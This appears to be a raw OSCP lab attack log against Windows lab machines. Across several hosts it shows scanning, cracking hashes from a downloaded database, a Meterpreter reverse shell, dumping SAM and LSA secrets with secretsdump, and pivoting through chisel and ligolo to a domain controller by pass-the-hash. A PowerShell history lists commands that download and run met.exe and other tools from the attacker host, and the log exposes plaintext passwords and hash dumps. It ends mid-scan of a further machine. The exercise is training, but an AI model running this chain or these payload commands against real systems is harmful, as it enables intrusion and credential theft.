┌──(kali㉿kali)-[~/oscpb]
└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.237.153
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-03 11:53 CET
Nmap scan report for 192.168.237.153
Host is up (0.039s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8000/tcp open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
|_http-open-proxy: Proxy might be redirecting requests
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/3%OT=22%CT=1%CU=33816%PV=Y%DS=4%DC=T%G=Y%TM=674E
OS:E353%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=108%TI=I%CI=I%TS=U)OPS(O
OS:1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578NW8NNS%O6=M57
OS:8NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=
OS:80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2
OS:(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80
OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q
OS:=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G
OS:)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-03T10:54:07
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   42.33 ms 192.168.45.1
2   42.23 ms 192.168.45.254
3   42.38 ms 192.168.251.1
4   42.68 ms 192.168.237.153

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.74 seconds
                                                                                     
┌──(kali㉿kali)-[~/oscpb]
└─$ cd ..     

──(kali㉿kali)-[~/oscpb]
└─$ feroxbuster -u http://192.168.237.153:8000 
                                                                                     
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.237.153:8000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      165c http://192.168.237.153:8000/aspnet_client => http://192.168.237.153:8000/aspnet_client/
200      GET      359l     2112w   178556c http://192.168.237.153:8000/iisstart.png
200      GET       32l       54w      696c http://192.168.237.153:8000/
301      GET        2l       10w      159c http://192.168.237.153:8000/partner => http://192.168.237.153:8000/partner/
200      GET        7l       38w    16406c http://192.168.237.153:8000/partner/db
200      GET        7l       38w    16406c http://192.168.237.153:8000/partner/DB
301      GET        2l       10w      159c http://192.168.237.153:8000/Partner => http://192.168.237.153:8000/Partner/
200      GET        7l       38w    16406c http://192.168.237.153:8000/Partner/db
200      GET        1l        6w       37c http://192.168.237.153:8000/partner/CHANGELOG
200      GET        7l       38w    16406c http://192.168.237.153:8000/Partner/DB
200      GET        1l        6w       37c http://192.168.237.153:8000/Partner/CHANGELOG
404      GET       42l      157w     1914c http://192.168.237.153:8000/con
404      GET       42l      157w     1928c http://192.168.237.153:8000/aspnet_client/con
301      GET        2l       10w      165c http://192.168.237.153:8000/Aspnet_client => http://192.168.237.153:8000/Aspnet_client/
404      GET       42l      157w     1922c http://192.168.237.153:8000/partner/con
404      GET       42l      157w     1922c http://192.168.237.153:8000/Partner/con
301      GET        2l       10w      165c http://192.168.237.153:8000/aspnet_Client => http://192.168.237.153:8000/aspnet_Client/
404      GET       42l      157w     1914c http://192.168.237.153:8000/aux
404      GET       42l      157w     1928c http://192.168.237.153:8000/aspnet_client/aux
404      GET       42l      157w     1922c http://192.168.237.153:8000/partner/aux
404      GET       42l      157w     1928c http://192.168.237.153:8000/Aspnet_client/con
404      GET       42l      157w     1922c http://192.168.237.153:8000/Partner/aux
404      GET        0l        0w     1245c http://192.168.237.153:8000/partner/lines
404      GET        0l        0w     1245c http://192.168.237.153:8000/aspnet_client/sharethispopupv2
301      GET        2l       10w      176c http://192.168.237.153:8000/aspnet_client/system_web => http://192.168.237.153:8000/aspnet_client/system_web/
200      GET        1l        6w       37c http://192.168.237.153:8000/partner/changelog
404      GET       42l      157w     1928c http://192.168.237.153:8000/aspnet_Client/con
404      GET       42l      157w     1928c http://192.168.237.153:8000/Aspnet_client/aux
200      GET        1l        6w       37c http://192.168.237.153:8000/Partner/changelog
301      GET        2l       10w      165c http://192.168.237.153:8000/ASPNET_CLIENT => http://192.168.237.153:8000/ASPNET_CLIENT/
200      GET        7l       38w    16406c http://192.168.237.153:8000/partner/Db
404      GET        0l        0w     1245c http://192.168.237.153:8000/partner/10years
404      GET        0l        0w     1245c http://192.168.237.153:8000/aspnet_client/Content--id-13
404      GET        0l        0w     1245c http://192.168.237.153:8000/aspnet_client/system_web/errorpage
404      GET       42l      157w     1939c http://192.168.237.153:8000/aspnet_client/system_web/con
301      GET        2l       10w      176c http://192.168.237.153:8000/Aspnet_client/system_web => http://192.168.237.153:8000/Aspnet_client/system_web/
404      GET       42l      157w     1928c http://192.168.237.153:8000/aspnet_Client/aux
200      GET        7l       38w    16406c http://192.168.237.153:8000/Partner/Db
400      GET        6l       26w      324c http://192.168.237.153:8000/error%1F_log
400      GET        6l       26w      324c http://192.168.237.153:8000/partner/error%1F_log
400      GET        6l       26w      324c http://192.168.237.153:8000/aspnet_client/error%1F_log
301      GET        2l       10w      176c http://192.168.237.153:8000/aspnet_Client/system_web => http://192.168.237.153:8000/aspnet_Client/system_web/
404      GET       42l      157w     1928c http://192.168.237.153:8000/ASPNET_CLIENT/con
400      GET        6l       26w      324c http://192.168.237.153:8000/Partner/error%1F_log
404      GET        0l        0w     1245c http://192.168.237.153:8000/partner/low
404      GET       42l      157w     1914c http://192.168.237.153:8000/prn
404      GET       42l      157w     1939c http://192.168.237.153:8000/aspnet_client/system_web/aux
404      GET       42l      157w     1928c http://192.168.237.153:8000/aspnet_client/prn
404      GET       42l      157w     1922c http://192.168.237.153:8000/partner/prn
404      GET       42l      157w     1939c http://192.168.237.153:8000/Aspnet_client/system_web/con
404      GET       42l      157w     1922c http://192.168.237.153:8000/Partner/prn
400      GET        6l       26w      324c http://192.168.237.153:8000/Aspnet_client/error%1F_log
404      GET       42l      157w     1928c http://192.168.237.153:8000/ASPNET_CLIENT/aux
404      GET       42l      157w     1939c http://192.168.237.153:8000/aspnet_Client/system_web/con
404      GET        0l        0w     1245c http://192.168.237.153:8000/ASPNET_CLIENT/counseling
404      GET       42l      157w     1928c http://192.168.237.153:8000/Aspnet_client/prn
404      GET       42l      157w     1939c http://192.168.237.153:8000/Aspnet_client/system_web/aux
400      GET        6l       26w      324c http://192.168.237.153:8000/aspnet_Client/error%1F_log
301      GET        2l       10w      176c http://192.168.237.153:8000/ASPNET_CLIENT/system_web => http://192.168.237.153:8000/ASPNET_CLIENT/system_web/
404      GET       42l      157w     1939c http://192.168.237.153:8000/aspnet_Client/system_web/aux
404      GET       42l      157w     1928c http://192.168.237.153:8000/aspnet_Client/prn
400      GET        6l       26w      324c http://192.168.237.153:8000/aspnet_client/system_web/error%1F_log
404      GET       42l      157w     1939c http://192.168.237.153:8000/ASPNET_CLIENT/system_web/con
404      GET       42l      157w     1939c http://192.168.237.153:8000/aspnet_client/system_web/prn
400      GET        6l       26w      324c http://192.168.237.153:8000/ASPNET_CLIENT/error%1F_log
400      GET        6l       26w      324c http://192.168.237.153:8000/Aspnet_client/system_web/error%1F_log
404      GET       42l      157w     1939c http://192.168.237.153:8000/ASPNET_CLIENT/system_web/aux
404      GET       42l      157w     1928c http://192.168.237.153:8000/ASPNET_CLIENT/prn
404      GET       42l      157w     1939c http://192.168.237.153:8000/Aspnet_client/system_web/prn
400      GET        6l       26w      324c http://192.168.237.153:8000/aspnet_Client/system_web/error%1F_log
404      GET       42l      157w     1939c http://192.168.237.153:8000/aspnet_Client/system_web/prn
400      GET        6l       26w      324c http://192.168.237.153:8000/ASPNET_CLIENT/system_web/error%1F_log
404      GET       42l      157w     1939c http://192.168.237.153:8000/ASPNET_CLIENT/system_web/prn
[####################] - 4m    330031/330031  0s      found:73      errors:61     
[####################] - 2m     30000/30000   211/s   http://192.168.237.153:8000/ 
[####################] - 2m     30000/30000   208/s   http://192.168.237.153:8000/aspnet_client/ 
[####################] - 2m     30000/30000   209/s   http://192.168.237.153:8000/partner/ 
[####################] - 3m     30000/30000   192/s   http://192.168.237.153:8000/Partner/ 
[####################] - 3m     30000/30000   186/s   http://192.168.237.153:8000/Aspnet_client/ 
[####################] - 3m     30000/30000   173/s   http://192.168.237.153:8000/aspnet_Client/ 
[####################] - 3m     30000/30000   171/s   http://192.168.237.153:8000/aspnet_client/system_web/ 
[####################] - 3m     30000/30000   184/s   http://192.168.237.153:8000/ASPNET_CLIENT/ 
[####################] - 3m     30000/30000   194/s   http://192.168.237.153:8000/Aspnet_client/system_web/ 
[####################] - 2m     30000/30000   223/s   http://192.168.237.153:8000/aspnet_Client/system_web/ 
[####################] - 86s    30000/30000   347/s   http://192.168.237.153:8000/ASPNET_CLIENT/system_web/                                        


Placing this url on the web browser http://192.168.237.153:8000/partner/db dowloaded the db file
#Opening the db file I found the hash password for support and ecop
┌──(kali㉿kali)-[~/Downloads]
└─$ cat db          
]D�D��:�GtablepartnerspartnersCREATE TABLE "partners" (
        "id"    INTEGER NOT NULL,
        "name"  TEXT NOT NULL,
        "password"      TEXT NOT NULL,
        "desc"  TEXT NOT NULL,
        PRIMARY KEY("id" AUTOINCREMENT)
���%Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�
+�Msupport26231162520c611ccabfb18b5ae4dff2support account for internal use+Mecorp7007296521223107d3445ea0db5a04f9-

I used this website to crack the hash sine other could not including hashcat. https://crackstation.net/

With the plain text password of support, I was able to access the ssh shell then using my met.exe payload, I got a reverse shell on a full interactive shell.
Running winpeas on the PC, I found admintool.exe file, I tested it to see how it works, my test got me the admin hash

PS C:\Users\support> .\admintool.exe whoami
.\admintool.exe whoami
Enter administrator password:
dummy
thread 'main' panicked at 'assertion failed: `(left == right)`
  left: `"275876e34cf609db118f3d84b799a790"`,
 right: `"05f8ba9f047f799adbea95a16de2ef5d"`: Wrong administrator password!', src/main.rs:78:5
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace

I cracked the hashes using https://crackstation.net/ and with one of the outputa I was able to login as administrator
──(kali㉿kali)-[~]
└─$ ssh administrator@192.168.119.153
administrator@192.168.119.153's password: 















Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

administrator@MS01 C:\Users\Administrator>whoami
ms01\administrator

administrator@MS01 C:\Users\Administrator>hostname
MS01

administrator@MS01 C:\Users\Administrator>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6


I also used my met.exe file to get an interactive shell. 
Because I have admin creds, I ran impacket secrete dump to dump some hashes for some users that I have

┌──(kali㉿kali)-[~/oscpc]
└─$ sudo impacket-secretsdump ./administrator:December31@192.168.119.153                                           
[sudo] password for kali: 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xa5403534b0978445a2df2d30d19a7980
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
[*] Dumping cached domain logon information (domain/username:hash)
OSCP.EXAM/Administrator:$DCC2$10240#Administrator#a3a38f45ff2adaf28e945577e9e2b57a: (2022-11-10 10:06:42)
OSCP.EXAM/web_svc:$DCC2$10240#web_svc#130379745455ae62bbf41faa0572f6d3: (2022-11-14 08:58:38)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
OSCP\MS01$:aes256-cts-hmac-sha1-96:3d0f316728211769312dffddd43476380598c2dea2fab075212fa87228acab62
OSCP\MS01$:aes128-cts-hmac-sha1-96:4359786c17d328b2133b5e1a980e2398
OSCP\MS01$:des-cbc-md5:4cfbb6435d048385
OSCP\MS01$:plain_password_hex:2f03d3165f893158585b7c4669f04ab21862b363fb00751b1975729947c89e55039410597709d1c67d41bd7f01e061030391f73dd2f7cf3527a8e1db37e307c9acf9e64e5901cdb596958ade54d8e300aa5a19766840a09e74c68a2781066741f303ff398ebaded4b56e3b1f8cfe794681c6fae3e86c7fad733a963a660101f9627122bd63513cdc8a8954133b791de17c4e89a0dc60793785fe4e2661ed4de25c97863521cc0eb68bbe2076fb7064076039075d7bebcd159148c13f1f8153b7b29791ae43528040d28b00b64eca080ecf2d3726f2479efc602103735bdd1fc3428d08dfb8143a79e3b7fb362331351f
OSCP\MS01$:aad3b435b51404eeaad3b435b51404ee:eaa1d4636ebc36f6c2a4476d4be210c0:::
[*] DefaultPassword 
oscp.exam\celia.almeda:7k8XHk3dMtmpnC7
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x14cc9accbb06d4af8f07295749933b06cf0d6dfd
dpapi_userkey:0x4c31eb802e3529d34f198a0473a6745cf5948527
[*] NL$KM 
 0000   F1 9F 8D 0A 3D 6B 2D 13  69 96 2E 4C 32 4D C3 66   ....=k-.i..L2M.f
 0010   D5 36 97 AB 1F 0B F2 38  11 3E DF 05 AE DF 31 70   .6.....8.>....1p
 0020   C0 E3 97 A0 08 31 A9 2A  E3 88 48 DD 2C 88 86 56   .....1.*..H.,..V
 0030   83 C9 79 90 03 D5 9D 28  C1 BE 33 D6 0E 7B B7 9B   ..y....(..3..{..
NL$KM:f19f8d0a3d6b2d1369962e4c324dc366d53697ab1f0bf238113edf05aedf3170c0e397a00831a92ae38848dd2c88865683c9799003d59d28c1be33d60e7bb79b
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

For some restrictions I could not run sharphound or powerview on MS01 because it is not connecting to LDAP

I checked the admin powershell history and found a password 

PS C:\Users\Administrator> cd C:\Users\Administrator\appdata\roaming\microsoft\windows\PowerShell\          
cd C:\Users\Administrator\appdata\roaming\microsoft\windows\PowerShell\
PS C:\Users\Administrator\appdata\roaming\microsoft\windows\PowerShell> ls
ls


    Directory: C:\Users\Administrator\appdata\roaming\microsoft\windows\PowerShell


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        11/21/2022   2:42 AM                PSReadLine                                                           


PS C:\Users\Administrator\appdata\roaming\microsoft\windows\PowerShell> cd PSReadLine 
cd PSReadLine 
PS C:\Users\Administrator\appdata\roaming\microsoft\windows\PowerShell\PSReadLine> ls
ls


    Directory: C:\Users\Administrator\appdata\roaming\microsoft\windows\PowerShell\PSReadLine


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         12/6/2024   3:26 AM            431 ConsoleHost_history.txt                                              
-a----        11/21/2022   2:40 AM             88 ConsoleHost_history.txt.1                                            


PS C:\Users\Administrator\appdata\roaming\microsoft\windows\PowerShell\PSReadLine> cat *
cat *
C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
C:\users\support\admintool.exe cmd
shutdown /r /t 7
iwr -uri http://192.168.45.161:80/met.exe -Outfile met.exe
iwr -uri http://192.168.45.161:80/agent.exe -Outfile agent.exe
.\met.exe
.\agent.exe -connect 192.168.45.161:11601 -ignore-cert
ls
.\met.exe
iwr -uri http://192.168.45.161:80/chisel.exe -Outfile chisel.exe
ls
.\chisel.exe client 192.168.45.161:8001 R:socks
C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
C:\users\support\admintool.exe cmd
PS C:\Users\Administrator\appdata\roaming\microsoft\windows\PowerShell\PSReadLine>

#I pivoted via ligolo to test the found hashes. Have some vpn problem, then changed chisel
With the found password I was able to login as administrator to MS02 via winrm

┌──(kali㉿kali)-[~/oscpc]
└─$ proxychains -q evil-winrm -i 10.10.79.154 -u administrator -p hghgib6vHT3bVWf             

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
ms02\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
MS02
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

#I found windows.old folder, dumped the sam and system file I found there

*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         12/7/2019   1:14 AM                PerfLogs
d-r---        12/20/2022   5:30 AM                Program Files
d-r---        11/10/2022   2:52 AM                Program Files (x86)
d-r---        11/14/2022   6:32 AM                Users
d-----        12/20/2022   5:31 AM                Windows
d-----          4/4/2022   6:00 AM                windows.old
-a----         12/6/2024  12:42 AM           2693 output.txt
-a----         12/6/2024   5:04 AM          49152 sam
-a----         12/6/2024   5:05 AM       12705792 system


*Evil-WinRM* PS C:\> cd windows.old
*Evil-WinRM* PS C:\windows.old> ls


    Directory: C:\windows.old


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/23/2022   3:01 PM                PerfLogs
d-----          4/4/2022   6:19 AM                Program Files
d-----          4/4/2022   6:20 AM                Program Files (x86)
d-----         3/23/2022   3:01 PM                Recovery
d-----         3/23/2022   3:01 PM                Users
d-----          4/4/2022   6:02 AM                Windows


*Evil-WinRM* PS C:\windows.old> cd windows
*Evil-WinRM* PS C:\windows.old\windows> ls


    Directory: C:\windows.old\windows


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
/22/2022   3:08 PM                ShellComponents
d-----         3/22/2022   3:07 PM                SKB
d-----         3/22/2022   3:08 PM                SoftwareDistribution
d-----         3/22/2022   3:08 PM                Speech
d-----          4/4/2022   6:09 AM                System32
d-----         3/22/2022   3:08 PM                SysWOW64
-a----          4/4/2022   6:00 AM            200 bootstat.dat
-a----          4/4/2022   6:00 AM             18 hh.exe


*Evil-WinRM* PS C:\windows.old\windows> cd system32
*Evil-WinRM* PS C:\windows.old\windows\system32> ls


    Directory: C:\windows.old\windows\system32


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         12/7/2019   1:14 AM                AppLocker
d-----          4/4/2022   6:03 AM                Boot
d---s-          4/4/2022   6:03 AM                Configuration
d-----          4/4/2022   6:03 AM                DriverState
d-----          4/4/2022   6:03 AM                DriverStore
d-----          4/4/2022   6:04 AM                en-US
d---s-          4/4/2022   6:06 AM                Microsoft
-a----         12/7/2019   1:09 AM         113256 compmgmt.msc
-a----         12/7/2019   1:09 AM           9571 ResPriHMImageList
-a----         12/7/2019   1:09 AM           9196 ResPriHMImageListLowCost
-a----         12/7/2019   1:09 AM           8977 ResPriImageList
-a----         12/7/2019   1:09 AM           8690 ResPriImageListLowCost
-a----          4/4/2022   6:00 AM          57344 SAM
-a----          4/4/2022   6:00 AM       11636736 SYSTEM
-


*Evil-WinRM* PS C:\windows.old\windows\system32> download SAM
                                        
Info: Downloading C:\windows.old\windows\system32\SAM to SAM
                                        
Info: Download successful!
*Evil-WinRM* PS C:\windows.old\windows\system32> download SYSTEM
                                        
Info: Downloading C:\windows.old\windows\system32\SYSTEM to SYSTEM
                                        
Info: Down

I extracted the file with

──(kali㉿kali)-[~/oscpc]
└─$ sudo impacket-secretsdump -sam SAM -system SYSTEM LOCAL
[sudo] password for kali: 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up... 


With tom_admin hash, I got access to DC01 as admin


┌──(kali㉿kali)-[~/oscpc]
└─$ proxychains -q evil-winrm -i 10.10.79.152 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tom_admin\Documents> whoami
oscp\tom_admin
*Evil-WinRM* PS C:\Users\tom_admin\Documents> hostname
DC01
*Evil-WinRM* PS C:\Users\tom_admin\Documents> cd ..
*Evil-WinRM* PS C:\Users\tom_admin> cd ..
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/12/2022   8:38 AM                Administrator
d-r---        3/25/2022   7:53 AM                Public
d-----        12/6/2024   5:30 AM                tom_admin


*Evil-WinRM* PS C:\Users> cd administrator
*Evil-WinRM* PS C:\Users\administrator> cd Desktop
*Evil-WinRM* PS C:\Users\administrator\Desktop> ls


    Directory: C:\Users\administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        12/6/2024  12:41 AM             34 proof.txt


*Evil-WinRM* PS C:\Users\administrator\Desktop> cat proof.txt
9afc68b46b390df3b0f426e30c6d279e
*Evil-WinRM* PS C:\Users\administrator\Desktop> 

     
Standalone machines .156 Frankfurt
┌──(kali㉿kali)-[~/oscpc]
└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.119.156                              
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-06 17:52 CET
Nmap scan report for 192.168.119.156
Host is up (0.036s latency).
Not shown: 984 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e:62:fd:92:52:6f:64:b1:34:48:8d:1e:52:f1:74:c6 (RSA)
|   256 1b:f7:0c:c7:1b:05:12:a9:c5:c5:78:b7:2a:54:d2:83 (ECDSA)
|_  256 ee:d4:a1:1a:07:b4:9f:d9:e5:2d:f6:b8:8d:dd:bf:d7 (ED25519)
25/tcp   open  smtp     Exim smtpd 4.90_1
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.161], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
|_ssl-date: 2024-12-06T16:52:16+00:00; -31s from scanner time.
53/tcp   open  domain   ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.18-Ubuntu
80/tcp   open  http     nginx
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: oscp.exam &mdash; Coming Soon
110/tcp  open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: USER AUTH-RESP-CODE SASL(PLAIN LOGIN) RESP-CODES CAPA STLS TOP PIPELINING UIDL
143/tcp  open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: LITERAL+ AUTH=PLAIN OK LOGIN-REFERRALS more AUTH=LOGINA0001 SASL-IR capabilities Pre-login STARTTLS have ENABLE IMAP4rev1 ID IDLE listed post-login
465/tcp  open  ssl/smtp Exim smtpd 4.90_1
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.161], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
|_ssl-date: 2024-12-06T16:52:32+00:00; -13s from scanner time.
587/tcp  open  smtp     Exim smtpd 4.90_1
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.161], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
|_ssl-date: 2024-12-06T16:53:05+00:00; +19s from scanner time.
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_imap-capabilities: SASL-IR LITERAL+ IMAP4rev1 capabilities AUTH=PLAIN have post-login listed Pre-login IDLE OK LOGIN-REFERRALS more AUTH=LOGINA0001 ID ENABLE
995/tcp  open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: PIPELINING AUTH-RESP-CODE USER CAPA UIDL TOP SASL(PLAIN LOGIN) RESP-CODES
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
